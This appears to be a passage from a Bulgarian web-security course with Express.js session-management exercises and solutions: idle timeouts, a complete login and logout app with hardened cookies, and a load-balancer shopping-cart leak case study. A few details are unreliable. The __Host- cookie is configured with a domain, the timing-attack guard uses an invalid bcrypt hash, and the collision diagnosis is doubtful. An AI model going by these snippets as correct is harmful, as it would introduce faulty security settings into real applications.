   - Потребител се логва на public компютър (библиотека, хотел)
   - Забравя да се logout-не
   - Дни/седмици по-късно, друг човек използва същия браузър
   - Session cookie все още е валиден - пълен достъп до акаунта
3. **Поправка:**
```javascript
// Express
app.use(session({
  cookie: {
    maxAge: 1800000  // 30 минути
  },
  rolling: true  // Refresh expiration при activity
}));

// Server-side cleanup
const RedisStore = require('connect-redis')(session);
app.use(session({
  store: new RedisStore({
    client: redisClient,
    ttl: 1800  // 30 мин server-side expiration
  })
}));

// Activity-based invalidation
app.use((req, res, next) => {
  if (req.session && req.session.lastActivity) {
    const now = Date.now();
    const idle = now - req.session.lastActivity;
    if (idle > 30 * 60 * 1000) {  // 30 мин неактивност
      return req.session.destroy(() => {
        res.redirect('/login?expired=1');
      });
    }
  }
  req.session.lastActivity = Date.now();
  next();
});
```

---

**Пълна secure конфигурация:**
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: '__Host-sessionId',  // Cookie prefix за extra security
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 1800000,
    path: '/',
    domain: 'example.com'
  },
  store: new RedisStore({ client: redisClient, ttl: 1800 })
}));
```

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Full Authentication Implementation

**Практическа имплементация:** Създайте пълно Node.js/Express приложение, което имплементира:
- User login със създаване на сесия
- Session ID регенерация след успешна автентикация
- Защитен dashboard route, изискващ автентикация
- Правилен logout, който унищожава сесията
- Всички препоръчани security cookie атрибути

Включете коментари, обясняващи всяка мярка за сигурност.

<CollapsibleSection title="✅ Решение">

````javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const Redis = require('ioredis');
const bcrypt = require('bcrypt');
const helmet = require('helmet');

const app = express();

// ========================================
// SECURITY MIDDLEWARE
// ========================================

// Helmet добавя security headers (XSS protection, etc.)
app.use(helmet());

// Parse request bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========================================
// REDIS SESSION STORE
// ========================================

// Redis клиент за session storage
// Централизиран store позволява multi-server scaling
const redisClient = new Redis({
  host: process.env.REDIS_HOST || 'localhost',
  port: process.env.REDIS_PORT || 6379,
  password: process.env.REDIS_PASSWORD,
  // Retry strategy за reconnection
  retryStrategy: (times) => Math.min(times * 50, 2000)
});

redisClient.on('error', (err) => console.error('Redis error:', err));
redisClient.on('connect', () => console.log('Redis connected'));

// ========================================
// SESSION CONFIGURATION
// ========================================

app.use(session({
  // Уникално име за cookie - избягва default "connect.sid"
  // __Host- prefix изисква secure и same-origin
  name: '__Host-sid',

  // Дълъг, случаен secret от environment variable
  // НИКОГА не hardcode в production
  secret: process.env.SESSION_SECRET,

  // Използвай Redis за session storage
  // Позволява scaling и persistence
  store: new RedisStore({
    client: redisClient,
    prefix: 'myapp:sess:',  // Namespace за keys
    ttl: 1800  // 30 минути TTL в секунди
  }),

  // НЕ запазвай сесията ако не е модифицирана
  // Намалява write операции
  resave: false,

  // НЕ създавай сесия докато няма данни за запис
  // Избягва излишни сесии за anonymous visitors
  saveUninitialized: false,

  // Rolling: обнови cookie expiration при всяка заявка
  // Потребителите остават логнати докато са активни
  rolling: true,

  // Cookie security settings
  cookie: {
    // HTTPS only - предотвратява MITM sniffing
    secure: process.env.NODE_ENV === 'production',

    // JavaScript не може да достъпва cookie
    // Защита от XSS session theft
    httpOnly: true,

    // Cookie не се изпраща при cross-site requests
    // Защита от CSRF атаки
    sameSite: 'strict',

    // 30 минути expiration
    // Кратък lifetime намалява window за hijacking
    maxAge: 30 * 60 * 1000,

    // Cookie е валидно за целия сайт
    path: '/'
  }
}));

// ========================================
// MOCK USER DATABASE
// ========================================

// В реално приложение - използвайте база данни!
const users = new Map();

// Seed test user (password: 'securePassword123')
(async () => {
  const hashedPassword = await bcrypt.hash('securePassword123', 12);
  users.set('testuser', {
    id: 1,
    username: 'testuser',
    password: hashedPassword,
    role: 'user'
  });
})();

// ========================================
// AUTHENTICATION MIDDLEWARE
// ========================================

// Middleware за проверка дали потребителят е автентикиран
const requireAuth = (req, res, next) => {
  if (req.session && req.session.user) {
    // Проверка за session freshness
    const now = Date.now();
    const lastActivity = req.session.lastActivity || now;
    const idleTime = now - lastActivity;

    // Ако е бил неактивен повече от 30 мин, invalidate
    if (idleTime > 30 * 60 * 1000) {
      return req.session.destroy(err => {
        res.status(401).json({ error: 'Session expired due to inactivity' });
      });
    }

    // Update last activity timestamp
    req.session.lastActivity = now;
    return next();
  }

  // Не е автентикиран
  res.status(401).json({ error: 'Authentication required' });
};

// ========================================
// ROUTES
// ========================================

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ----------------------------------------
// LOGIN
// ----------------------------------------
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Input validation
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  // Find user
  const user = users.get(username);
  if (!user) {
    // Timing attack prevention: still hash something
    await bcrypt.compare(password, '$2b$12$invalidhashtopreventtiming');
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Verify password
  const validPassword = await bcrypt.compare(password, user.password);
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ==========================================
  // CRITICAL: Regenerate Session ID after login
  // ==========================================
  // Това предотвратява Session Fixation атаки!
  // Стар (потенциално компрометиран) ID се заменя с нов
  req.session.regenerate(err => {
    if (err) {
      console.error('Session regeneration error:', err);
      return res.status(500).json({ error: 'Login failed' });
    }

    // Store user info in session (без паролата!)
    req.session.user = {
      id: user.id,
      username: user.username,
      role: user.role
    };

    // Track login time and activity
    req.session.loginTime = Date.now();
    req.session.lastActivity = Date.now();

    console.log(`User ${username} logged in. New session ID: ${req.sessionID}`);

    res.json({
      message: 'Login successful',
      user: req.session.user
    });
  });
});

// ----------------------------------------
// LOGOUT
// ----------------------------------------
app.post('/logout', (req, res) => {
  // Дори ако няма сесия, върни успех (idempotent)
  if (!req.session) {
    return res.json({ message: 'Already logged out' });
  }

  const username = req.session.user?.username || 'unknown';

  // ==========================================
  // Destroy session completely
  // ==========================================
  // Това премахва session data от store
  // и инвалидира session ID
  req.session.destroy(err => {
    if (err) {
      console.error('Logout error:', err);
      return res.status(500).json({ error: 'Logout failed' });
    }

    // Изчисти cookie от браузъра
    res.clearCookie('__Host-sid', {
      path: '/',
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict'
    });

    console.log(`User ${username} logged out`);

    res.json({ message: 'Logout successful' });
  });
});

// ----------------------------------------
// PROTECTED DASHBOARD
// ----------------------------------------
app.get('/dashboard', requireAuth, (req, res) => {
  res.json({
    message: 'Welcome to your dashboard!',
    user: req.session.user,
    sessionInfo: {
      loginTime: new Date(req.session.loginTime).toISOString(),
      lastActivity: new Date(req.session.lastActivity).toISOString()
    }
  });
});

// ----------------------------------------
// GET CURRENT USER
// ----------------------------------------
app.get('/me', requireAuth, (req, res) => {
  res.json({ user: req.session.user });
});

// ========================================
// ERROR HANDLING
// ========================================

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// ========================================
// START SERVER
// ========================================

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});

// ========================================
// SECURITY MEASURES SUMMARY
// ========================================
/*
1. Session ID Regeneration - предотвратява Session Fixation
2. HttpOnly cookie - защита от XSS session theft
3. Secure cookie - само HTTPS, защита от MITM
4. SameSite=Strict - защита от CSRF
5. Short maxAge (30 min) - намалява hijacking window
6. Redis store - позволява scaling и instant invalidation
7. Rolling sessions - активните потребители остават логнати
8. Activity tracking - idle timeout за допълнителна сигурност
9. Helmet middleware - security headers
10. Password hashing с bcrypt - защита на credentials
11. Timing attack prevention - consistent response time
*/
````

**Тестване:**
```bash
# Login
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"securePassword123"}' \
  -c cookies.txt -v

# Access protected route
curl http://localhost:3000/dashboard -b cookies.txt

# Logout
curl -X POST http://localhost:3000/logout -b cookies.txt

# Try to access after logout (should fail)
curl http://localhost:3000/dashboard -b cookies.txt
```

</CollapsibleSection>

</ExerciseCard>

---

<ExerciseCard difficulty="hard">

### Case Study: Shopping Cart Bug

**Case Study Analysis:** E-commerce компания съобщава, че някои клиенти виждат кошниците на други потребители. Тяхната архитектура включва:
- 5 web servers зад load balancer
- Сесии, съхранявани в локалната памет на всеки сървър
- Round-robin load balancing

A) Диагностицирайте основната причина за този проблем
B) Обяснете точно как се проявява този бъг (проследете проблемна последователност от заявки)
C) Проектирайте решение, което коригира проблема
D) Какви допълнителни съображения трябва да се адресират за предотвратяване на изтичане на данни между потребители?

<CollapsibleSection title="✅ Решение">

**A) Основна причина: Session State Collision**

Проблемът възниква от комбинацията на:
1. **In-memory session storage** на всеки сървър (не споделена)
2. **Round-robin load balancing** без session affinity
3. **Липса на session ID validation** между сървъри

Когато два потребителя получат случайно **същия Session ID** на различни сървъри, техните данни се смесват.

---

**B) Как се проявява бъгът - Request Sequence:**

```
Timeline:

T1: User A → LB → Server 1
    - Server 1 генерира Session ID: "abc123"
    - Създава session data: { cart: ['Product X'] }
    - Връща cookie: sessionId=abc123

T2: User B → LB → Server 3
    - Server 3 генерира Session ID: "abc123" (collision!)
    - Създава session data: { cart: ['Product Y', 'Product Z'] }
    - Връща cookie: sessionId=abc123

T3: User A добавя още продукт → LB → Server 3 (round-robin)
    - Server 3 получава sessionId=abc123
    - Намира session data на Server 3 (User B's data!)
    - User A вижда cart: ['Product Y', 'Product Z'] вместо своята

T4: User B обновява страницата → LB → Server 1
    - Server 1 получава sessionId=abc123
    - Намира session data на Server 1 (User A's data!)
    - User B вижда cart: ['Product X']
```

**Защо се случва collision:**
- Слаб random number generator за Session ID
- Недостатъчна entropy в ID генерацията
- Възможно: reuse на Session ID след server restart

---

**C) Решение: Централизиран Session Store**

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const Redis = require('ioredis');

// Redis Cluster за high availability
const redisClient = new Redis.Cluster([
  { host: 'redis-node-1', port: 6379 },
  { host: 'redis-node-2', port: 6379 },
  { host: 'redis-node-3', port: 6379 }
]);

const app = express();

app.use(session({
  // Силен, уникален secret
  secret: process.env.SESSION_SECRET,

  // Централизиран Redis store
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',
    ttl: 3600  // 1 час
  }),

  // Генерирай cryptographically secure IDs
  genid: (req) => {
    return require('crypto').randomBytes(32).toString('hex');
  },

  resave: false,
  saveUninitialized: false,

  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
  }
}));
```

**Архитектурна промяна:**

```
ПРЕДИ (Проблемна):
┌─────────────┐
│ Load Balancer│ Round-robin
└──────┬──────┘
       │
┌──────┴──────────────────────────────┐
│           │           │             │
▼           ▼           ▼             ▼
┌───────┐ ┌───────┐ ┌───────┐ ┌───────┐
│Server1│ │Server2│ │Server3│ │Server4│
│Memory │ │Memory │ │Memory │ │Memory │
│{abc:A}│ │{def:C}│ │{abc:B}│ │{ghi:D}│ ← COLLISION!
└───────┘ └───────┘ └───────┘ └───────┘


СЛЕД (Коректна):
┌─────────────┐
│ Load Balancer│ Round-robin (или any)
└──────┬──────┘
       │
┌──────┴──────────────────────────────┐
│           │           │             │
▼           ▼           ▼             ▼
┌───────┐ ┌───────┐ ┌───────┐ ┌───────┐
│Server1│ │Server2│ │Server3│ │Server4│
│Stateless│Stateless│Stateless│Stateless│
└───┬───┘ └───┬───┘ └───┬───┘ └───┬───┘
    │         │         │         │
    └─────────┴────┬────┴─────────┘
                   │
                   ▼
          ┌───────────────┐
          │ Redis Cluster │
          │{abc:A, def:B, │
          │ ghi:C, ...}   │
          └───────────────┘
          Single source of truth
```

---

**D) Допълнителни съображения за предотвратяване на data leakage:**

**1. Session ID Security:**
```javascript
// Използвай cryptographically secure random IDs
const crypto = require('crypto');
genid: () => crypto.randomBytes(32).toString('hex')
// Резултат: 64 hex символа = 256 bits entropy
```

**2. Session Binding:**
```javascript
// Bind session към допълнителни user attributes
app.use((req, res, next) => {
  if (req.session.user) {
    // Валидирай fingerprint
    const fingerprint = createFingerprint(req);
    if (req.session.fingerprint !== fingerprint) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalid' });
    }
  }
  next();
});

function createFingerprint(req) {
  const data = [
    req.headers['user-agent'],
    req.headers['accept-language'],
    // НЕ включвай IP - може да се промени (mobile, VPN)
  ].join('|');
  return crypto.createHash('sha256').update(data).digest('hex');
}
```

**3. Audit Logging:**
```javascript
// Логвай suspicious activity
app.use((req, res, next) => {
  if (req.session.user) {
    const currentUser = req.session.user.id;
    const cartOwner = req.session.cart?.userId;

    if (cartOwner && cartOwner !== currentUser) {
      console.error('DATA LEAK DETECTED!', {
        sessionId: req.sessionID,
        currentUser,
        cartOwner,
        ip: req.ip,
        timestamp: new Date()
      });

      // Alert security team
      alertSecurityTeam({
        type: 'SESSION_DATA_MISMATCH',
        details: { currentUser, cartOwner, sessionId: req.sessionID }
      });

      // Destroy compromised session
      req.session.destroy();
      return res.status(500).json({ error: 'Session error detected' });
    }
  }
  next();
});
```

**4. Cart Ownership:**
```javascript
// Винаги запазвай owner ID в cart data
app.post('/cart/add', requireAuth, (req, res) => {
  if (!req.session.cart) {
    req.session.cart = {
      userId: req.session.user.id,  // Owner tracking
      createdAt: Date.now(),
      items: []
    };
  }

  // Валидирай ownership преди модификация
  if (req.session.cart.userId !== req.session.user.id) {
    console.error('Cart ownership mismatch!');
    req.session.cart = {
      userId: req.session.user.id,
      items: []
    };
  }

  req.session.cart.items.push(req.body.item);
  res.json({ cart: req.session.cart });
});
```

**5. Session Store TTL:**
```javascript
// Агресивен TTL за намаляване на collision window
store: new RedisStore({
  client: redisClient,
  ttl: 1800,  // 30 мин
  disableTouch: false  // Update TTL при всяка заявка
})
```

**6. Monitoring & Alerting:**
```javascript
// Monitor за abnormal session patterns
// - Един Session ID от много IP адреси
// - Бързи географски промени
// - Необичайно голям брой сесии от един IP
```

</CollapsibleSection>

</ExerciseCard>
